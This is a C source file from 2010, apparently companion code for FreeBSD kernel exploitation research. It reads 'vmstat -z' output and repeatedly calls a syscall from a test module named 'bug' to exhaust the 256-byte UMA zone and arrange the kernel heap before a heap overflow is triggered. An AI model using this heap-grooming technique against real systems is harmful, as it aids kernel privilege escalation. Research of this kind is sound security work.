/*
 * getzfree.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Parse the output of 'vmstat -z', extract the number of free items on
 * the '256' anonymous zone and consume them.  Then consume/allocate
 * another ITEMS_PER_SLAB number of items.
 *
 * $Id: getzfree.c,v 8167bfa7e34f 2010/02/17 13:36:17 argp $
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>

#define TARGET_SIZE         256
#define OP_ALLOC            1
#define OP_FREE             2
#define SLOTS               100

#define BUF_SIZE            256
#define LINE_SIZE           56

#define ITEMS_PER_SLAB      15

struct argz
{
    char *buf;
    u_int len;
    int op;
    u_int slot;
};

int     get_zfree(char *zname);

int
main(int argc, char *argv[])
{
    int sn, i, n, nobj;
    struct module_stat mstat;
    struct argz vargz;

    nobj = get_zfree("256");

    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, nobj);

    vargz.len = TARGET_SIZE;
    vargz.buf = calloc(vargz.len + 1, sizeof(char));

    if(vargz.buf == NULL)
    {
        perror("calloc");
        exit(1);
    }

    memset(vargz.buf, 0x41, vargz.len);

    mstat.version = sizeof(mstat);
    modstat(modfind("bug"), &mstat);
    sn = mstat.data.intval;
    vargz.op = OP_ALLOC;

    printf("---[ consuming %d items from the %d zone\n", nobj, TARGET_SIZE);

    for(i = 0; i < nobj; i++)
    {
        vargz.slot = i;
        syscall(sn, vargz);
    }

    nobj = get_zfree("256");
    printf("---[ free items on the %d zone: %d\n", TARGET_SIZE, nobj);

    printf("---[ allocating %d items on the %d zone...\n", ITEMS_PER_SLAB,
            TARGET_SIZE);

    for(n = i + ITEMS_PER_SLAB; i < n; i++)
    {
        vargz.slot = i;
        syscall(sn, vargz);
    }
    
    free(vargz.buf);
    return 0;
}

int
get_zfree(char *zname)
{
    unsigned int nsize, nlimit, nused, nfree, nreq, nfail;
    FILE *fp = NULL;
    char buf[BUF_SIZE];
    char iname[LINE_SIZE];

    nsize = nlimit = nused = nfree = nreq = nfail = 0;

    fp = popen("/usr/bin/vmstat -z", "r");

    if(fp == NULL)
    {
        perror("popen");
        exit(1);
    }

    memset(buf, 0, sizeof(buf));
    memset(iname, 0, sizeof(iname));

    while(fgets(buf, sizeof(buf) - 1, fp) != NULL)
    {
        sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &nsize, &nlimit,
                &nused, &nfree, &nreq, &nfail);

        if(strncmp(iname, zname, strlen(zname)) == 0)
        {
            break;
        }
    }

    pclose(fp);
    return nfree;
}

/* EOF */
